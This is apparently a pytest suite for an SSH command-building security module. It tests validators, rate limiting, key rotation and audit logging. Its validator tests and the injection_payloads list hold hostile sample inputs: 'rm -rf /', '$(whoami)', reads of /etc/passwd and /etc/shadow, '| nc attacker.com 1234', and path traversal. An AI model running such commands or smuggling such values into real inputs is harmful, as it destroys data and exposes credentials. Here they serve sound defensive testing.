"""Comprehensive security tests for SSH command building and execution."""

import pytest
import asyncio
from unittest.mock import Mock, patch, AsyncMock
from pathlib import Path

from docker_mcp.core.security import (
    SSHCommandBuilder,
    SSHRateLimiter,
    SSHAuditLog,
    SSHSecurityError,
    SSHKeyManager,
    SSHKeyRotationError
)


class TestSSHCommandBuilder:
    """Test SSH command builder security features."""
    
    @pytest.fixture
    def builder(self):
        """Create SSH command builder instance."""
        return SSHCommandBuilder()
    
    def test_validate_hostname_valid(self, builder):
        """Test valid hostname validation."""
        assert builder.validate_hostname("example.com") == "example.com"
        assert builder.validate_hostname("sub.example.com") == "sub.example.com"
        assert builder.validate_hostname("192.168.1.1") == "192.168.1.1"
        assert builder.validate_hostname("localhost") == "localhost"
    
    def test_validate_hostname_invalid(self, builder):
        """Test invalid hostname validation."""
        with pytest.raises(SSHSecurityError):
            builder.validate_hostname("example.com; rm -rf /")
        
        with pytest.raises(SSHSecurityError):
            builder.validate_hostname("example.com$(whoami)")
        
        with pytest.raises(SSHSecurityError):
            builder.validate_hostname("example.com`ls`")
        
        with pytest.raises(SSHSecurityError):
            builder.validate_hostname("")
        
        with pytest.raises(SSHSecurityError):
            builder.validate_hostname("a" * 254)  # Too long
    
    def test_validate_username_valid(self, builder):
        """Test valid username validation."""
        assert builder.validate_username("user") == "user"
        assert builder.validate_username("user123") == "user123"
        assert builder.validate_username("user_name") == "user_name"
        assert builder.validate_username("user-name") == "user-name"
    
    def test_validate_username_invalid(self, builder):
        """Test invalid username validation."""
        with pytest.raises(SSHSecurityError):
            builder.validate_username("user; echo hacked")
        
        with pytest.raises(SSHSecurityError):
            builder.validate_username("user$(id)")
        
        with pytest.raises(SSHSecurityError):
            builder.validate_username("123user")  # Can't start with number
        
        with pytest.raises(SSHSecurityError):
            builder.validate_username("")
        
        with pytest.raises(SSHSecurityError):
            builder.validate_username("user@host")
    
    def test_validate_path_valid(self, builder):
        """Test valid path validation."""
        assert builder.validate_path("/home/user/app") == "/home/user/app"
        assert builder.validate_path("/opt/docker/stacks") == "/opt/docker/stacks"
        assert builder.validate_path("/var/lib/docker") == "/var/lib/docker"
    
    def test_validate_path_traversal(self, builder):
        """Test path traversal attack prevention."""
        with pytest.raises(SSHSecurityError, match="traversal"):
            builder.validate_path("/home/../etc/passwd")
        
        with pytest.raises(SSHSecurityError, match="traversal"):
            builder.validate_path("/home/user/../../etc")
        
        with pytest.raises(SSHSecurityError):
            builder.validate_path("../../../etc/passwd")
    
    def test_validate_path_injection(self, builder):
        """Test path injection attack prevention."""
        with pytest.raises(SSHSecurityError):
            builder.validate_path("/home/user; rm -rf /")
        
        with pytest.raises(SSHSecurityError):
            builder.validate_path("/home/$(whoami)/app")
        
        with pytest.raises(SSHSecurityError):
            builder.validate_path("/home/`id`/app")
        
        with pytest.raises(SSHSecurityError):
            builder.validate_path("/home/user && cat /etc/passwd")
        
        with pytest.raises(SSHSecurityError):
            builder.validate_path("/home/user | nc attacker.com 1234")
    
    def test_validate_stack_name_valid(self, builder):
        """Test valid stack name validation."""
        assert builder.validate_stack_name("myapp") == "myapp"
        assert builder.validate_stack_name("my-app") == "my-app"
        assert builder.validate_stack_name("my_app") == "my_app"
        assert builder.validate_stack_name("app123") == "app123"
    
    def test_validate_stack_name_invalid(self, builder):
        """Test invalid stack name validation."""
        with pytest.raises(SSHSecurityError):
            builder.validate_stack_name("my app")  # No spaces
        
        with pytest.raises(SSHSecurityError):
            builder.validate_stack_name("my;app")
        
        with pytest.raises(SSHSecurityError):
            builder.validate_stack_name("docker")  # Reserved
        
        with pytest.raises(SSHSecurityError):
            builder.validate_stack_name("system")  # Reserved
        
        with pytest.raises(SSHSecurityError):
            builder.validate_stack_name("a" * 64)  # Too long
    
    def test_validate_docker_command(self, builder):
        """Test Docker command validation."""
        assert builder.validate_docker_command("ps") == "ps"
        assert builder.validate_docker_command("logs") == "logs"
        assert builder.validate_docker_command("compose") == "compose"
        
        with pytest.raises(SSHSecurityError):
            builder.validate_docker_command("rm")  # Could be dangerous without validation
        
        with pytest.raises(SSHSecurityError):
            builder.validate_docker_command("exec")  # Need additional validation
    
    def test_validate_compose_subcommand(self, builder):
        """Test Docker Compose subcommand validation."""
        assert builder.validate_compose_subcommand("up") == "up"
        assert builder.validate_compose_subcommand("down") == "down"
        assert builder.validate_compose_subcommand("ps") == "ps"
        
        with pytest.raises(SSHSecurityError):
            builder.validate_compose_subcommand("rm")
        
        with pytest.raises(SSHSecurityError):
            builder.validate_compose_subcommand("invalid")
    
    def test_validate_environment_variable(self, builder):
        """Test environment variable validation."""
        key, value = builder.validate_environment_variable("DATABASE_URL", "postgres://localhost/db")
        assert key == "DATABASE_URL"
        assert value == "postgres://localhost/db"
        
        with pytest.raises(SSHSecurityError):
            builder.validate_environment_variable("invalid-key", "value")
        
        with pytest.raises(SSHSecurityError):
            builder.validate_environment_variable("KEY", "value; echo hacked")
        
        with pytest.raises(SSHSecurityError):
            builder.validate_environment_variable("KEY", "value$(whoami)")
    
    def test_build_ssh_base_command(self, builder):
        """Test building secure SSH base command."""
        cmd = builder.build_ssh_base_command(
            hostname="example.com",
            username="user",
            port=22,
            identity_file="/home/user/.ssh/id_rsa"
        )
        
        assert "ssh" in cmd
        assert "-o" in cmd
        assert "StrictHostKeyChecking=yes" in cmd
        assert "PasswordAuthentication=no" in cmd
        assert "BatchMode=yes" in cmd
        assert "-i" in cmd
        assert "/home/user/.ssh/id_rsa" in cmd
        assert "user@example.com" in cmd
    
    def test_build_docker_compose_command(self, builder):
        """Test building secure Docker Compose command."""
        cmd = builder.build_docker_compose_command(
            project_name="myapp",
            compose_file="/opt/stacks/myapp/docker-compose.yml",
            subcommand="up",
            args=["--detach", "--build"],
            environment={"DATABASE_URL": "postgres://localhost/db"}
        )
        
        assert "docker compose" in cmd
        assert "--project-name" in cmd
        assert "myapp" in cmd
        assert "-f" in cmd
        assert "docker-compose.yml" in cmd
        assert "up" in cmd
        assert "--detach" in cmd
        assert "--build" in cmd
        assert "DATABASE_URL=" in cmd
    
    def test_build_docker_compose_command_injection(self, builder):
        """Test Docker Compose command injection prevention."""
        with pytest.raises(SSHSecurityError):
            builder.build_docker_compose_command(
                project_name="app; rm -rf /",
                compose_file="/opt/stacks/app/docker-compose.yml",
                subcommand="up",
                args=[]
            )
        
        with pytest.raises(SSHSecurityError):
            builder.build_docker_compose_command(
                project_name="myapp",
                compose_file="/opt/stacks/app/../../etc/passwd",
                subcommand="up",
                args=[]
            )
        
        with pytest.raises(SSHSecurityError):
            builder.build_docker_compose_command(
                project_name="myapp",
                compose_file="/opt/stacks/app/docker-compose.yml",
                subcommand="up",
                args=["--invalid-dangerous-arg"]
            )
    
    def test_build_remote_command(self, builder):
        """Test building secure remote command."""
        cmd = builder.build_remote_command(
            working_directory="/opt/app",
            command_parts=["docker", "ps", "-a"],
            environment={"TERM": "xterm"}
        )
        
        assert "cd" in cmd
        assert "/opt/app" in cmd
        assert "docker" in cmd
        assert "ps" in cmd
        assert "-a" in cmd
        assert "TERM=" in cmd
    
    def test_build_remote_command_length_limit(self, builder):
        """Test command length limit enforcement."""
        with pytest.raises(SSHSecurityError, match="too long"):
            builder.build_remote_command(
                working_directory="/opt/app",
                command_parts=["echo", "x" * 5000],
                environment={}
            )


class TestSSHRateLimiter:
    """Test SSH rate limiting functionality."""
    
    @pytest.fixture
    def limiter(self):
        """Create rate limiter instance."""
        return SSHRateLimiter(
            max_requests_per_minute=10,
            max_requests_per_hour=100,
            max_concurrent=3
        )
    
    def test_rate_limit_per_minute(self, limiter):
        """Test per-minute rate limiting."""
        host_id = "test-host"
        
        # Should allow initial requests
        for i in range(10):
            allowed, reason = limiter.check_rate_limit(host_id)
            assert allowed is True
            limiter.record_request(host_id)
            limiter.release_connection(host_id)
        
        # Should block after limit
        limiter.record_request(host_id)
        allowed, reason = limiter.check_rate_limit(host_id)
        assert allowed is False
        assert "per minute" in reason
    
    def test_rate_limit_concurrent(self, limiter):
        """Test concurrent connection limiting."""
        host_id = "test-host"
        
        # Should allow up to max concurrent
        for i in range(3):
            allowed, reason = limiter.check_rate_limit(host_id)
            assert allowed is True
            limiter.record_request(host_id)
        
        # Should block when at max concurrent
        allowed, reason = limiter.check_rate_limit(host_id)
        assert allowed is False
        assert "concurrent" in reason
        
        # Should allow after releasing
        limiter.release_connection(host_id)
        allowed, reason = limiter.check_rate_limit(host_id)
        assert allowed is True
    
    def test_rate_limit_cleanup(self, limiter):
        """Test old entry cleanup."""
        import time
        host_id = "test-host"
        
        # Record some requests
        for i in range(5):
            limiter.record_request(host_id)
            limiter.release_connection(host_id)
        
        # Mock time to simulate passage
        with patch('time.time', return_value=time.time() + 61):
            # Should have cleaned minute entries
            allowed, reason = limiter.check_rate_limit(host_id)
            assert allowed is True


class TestSSHKeyManager:
    """Test SSH key management and rotation."""
    
    @pytest.fixture
    def key_manager(self, tmp_path):
        """Create key manager instance."""
        return SSHKeyManager(
            key_directory=str(tmp_path / "keys"),
            rotation_days=30
        )
    
    @pytest.mark.asyncio
    async def test_generate_key_pair(self, key_manager):
        """Test SSH key pair generation."""
        with patch('subprocess.run') as mock_run:
            mock_run.return_value.returncode = 0
            mock_run.return_value.stdout = "2048 SHA256:abcd1234 comment"
            
            private_key, public_key = await key_manager.generate_key_pair(
                host_id="test-host",
                comment="test@docker-mcp"
            )
            
            assert "test-host" in private_key
            assert public_key == f"{private_key}.pub"
            
            # Verify ssh-keygen was called correctly
            mock_run.assert_called()
            call_args = mock_run.call_args[0][0]
            assert "ssh-keygen" in call_args
            assert "-t" in call_args
            assert "-N" in call_args
    
    @pytest.mark.asyncio
    async def test_check_rotation_needed(self, key_manager):
        """Test checking if key rotation is needed."""
        from datetime import datetime, timedelta
        
        # No metadata - should need rotation
        assert key_manager.check_rotation_needed("test-host") is True
        
        # Add recent key to metadata
        metadata = {
            "test-host": {
                "keys": [{
                    "created_at": datetime.utcnow().isoformat(),
                    "active": True
                }]
            }
        }
        key_manager._save_metadata(metadata)
        
        # Recent key - should not need rotation
        assert key_manager.check_rotation_needed("test-host") is False
        
        # Old key - should need rotation
        old_date = datetime.utcnow() - timedelta(days=91)
        metadata["test-host"]["keys"][0]["created_at"] = old_date.isoformat()
        key_manager._save_metadata(metadata)
        
        assert key_manager.check_rotation_needed("test-host") is True
    
    @pytest.mark.asyncio
    async def test_rotate_key_failure_rollback(self, key_manager):
        """Test key rotation rollback on failure."""
        with patch.object(key_manager, 'generate_key_pair') as mock_generate:
            mock_generate.return_value = ("/tmp/new_key", "/tmp/new_key.pub")
            
            with patch.object(key_manager, '_deploy_public_key') as mock_deploy:
                mock_deploy.side_effect = Exception("Deploy failed")
                
                with patch('os.unlink') as mock_unlink:
                    with pytest.raises(SSHKeyRotationError):
                        await key_manager.rotate_key(
                            host_id="test-host",
                            hostname="example.com",
                            username="user",
                            current_key_path="/tmp/old_key"
                        )
                    
                    # Verify cleanup was called
                    assert mock_unlink.call_count == 2  # Private and public key


class TestSSHAuditLog:
    """Test SSH audit logging."""
    
    def test_log_command(self, tmp_path):
        """Test command logging."""
        log_file = tmp_path / "audit.log"
        audit = SSHAuditLog(str(log_file))
        
        audit.log_command(
            host_id="test-host",
            username="user",
            command="docker ps -a",
            result="success"
        )
        
        # Verify log file was created
        assert log_file.exists()
        
        # Verify log content
        import json
        with open(log_file) as f:
            entry = json.loads(f.read())
            assert entry["host_id"] == "test-host"
            assert entry["username"] == "user"
            assert entry["success"] is True
            assert "command_hash" in entry
            assert entry["command_length"] == len("docker ps -a")
    
    def test_log_command_with_error(self, tmp_path):
        """Test command logging with error."""
        log_file = tmp_path / "audit.log"
        audit = SSHAuditLog(str(log_file))
        
        audit.log_command(
            host_id="test-host",
            username="user",
            command="docker ps -a",
            error="Permission denied"
        )
        
        import json
        with open(log_file) as f:
            entry = json.loads(f.read())
            assert entry["success"] is False
            assert entry["error"] == "Permission denied"


class TestCommandInjectionPrevention:
    """Test command injection prevention across all inputs."""
    
    @pytest.fixture
    def builder(self):
        return SSHCommandBuilder()
    
    injection_payloads = [
        "; rm -rf /",
        "&& cat /etc/passwd",
        "|| nc attacker.com 1234",
        "$(whoami)",
        "`id`",
        "> /etc/passwd",
        "< /etc/shadow",
        "| tee /tmp/output",
        "../../../etc/passwd",
        "~/.ssh/id_rsa",
        "${PATH}",
        "\\x00",
        "\n",
        "\r",
        "';DROP TABLE users;--",
    ]
    
    @pytest.mark.parametrize("payload", injection_payloads)
    def test_hostname_injection(self, builder, payload):
        """Test hostname injection prevention."""
        with pytest.raises(SSHSecurityError):
            builder.validate_hostname(f"example.com{payload}")
    
    @pytest.mark.parametrize("payload", injection_payloads)
    def test_username_injection(self, builder, payload):
        """Test username injection prevention."""
        with pytest.raises(SSHSecurityError):
            builder.validate_username(f"user{payload}")
    
    @pytest.mark.parametrize("payload", injection_payloads)
    def test_path_injection(self, builder, payload):
        """Test path injection prevention."""
        with pytest.raises(SSHSecurityError):
            builder.validate_path(f"/opt/app{payload}")
    
    @pytest.mark.parametrize("payload", injection_payloads)
    def test_stack_name_injection(self, builder, payload):
        """Test stack name injection prevention."""
        with pytest.raises(SSHSecurityError):
            builder.validate_stack_name(f"app{payload}")
    
    @pytest.mark.parametrize("payload", injection_payloads)
    def test_environment_value_injection(self, builder, payload):
        """Test environment value injection prevention."""
        with pytest.raises(SSHSecurityError):
            builder.validate_environment_variable("KEY", f"value{payload}")